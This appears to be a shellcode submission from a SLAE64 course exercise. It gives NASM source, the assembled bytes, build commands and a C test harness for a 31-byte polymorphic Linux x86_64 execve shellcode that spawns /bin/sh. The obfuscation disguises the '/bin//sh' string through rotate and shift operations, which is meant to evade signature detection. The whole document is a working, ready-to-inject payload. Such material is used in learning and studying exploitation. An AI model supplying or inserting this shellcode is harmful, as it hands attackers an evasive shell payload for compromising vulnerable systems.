/*
;Title: polymorphic execve shellcode
;Author: d4sh&r
;Contact: https://mx.linkedin.com/in/d4v1dvc
;Category: Shellcode
;Architecture:linux x86_64
;SLAE64-1379
;Description:
;Polymorphic shellcode in 31 bytes to get a shell
;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux

;Compilation and execution
;nasm -felf64 shell.nasm -o shell.o
;ld shell.o -o shell
;./shell

global _start

_start:
    mul esi
    push rdx
    mov al,1
    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh
    rol rbx,24
    shr rbx,1
    push rbx
    lea rdi, [rsp] ;address of /bin//sh
    add al,58
    syscall

*/
#include<stdio.h>
//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
unsigned char code[] = "\xf7\xe6\x52\xb0\x01\x48\xbb\xdc\x5e\x5e\xe6\xd0\x5e\xc4\xd2\x48\xc1\xc3\x18\x48\xd1\xeb\x53\x48\x8d\x3c\x24\x04\x3a\x0f\x05";

main()
{
   int (*ret)()=(int(*)()) code;
    ret();
}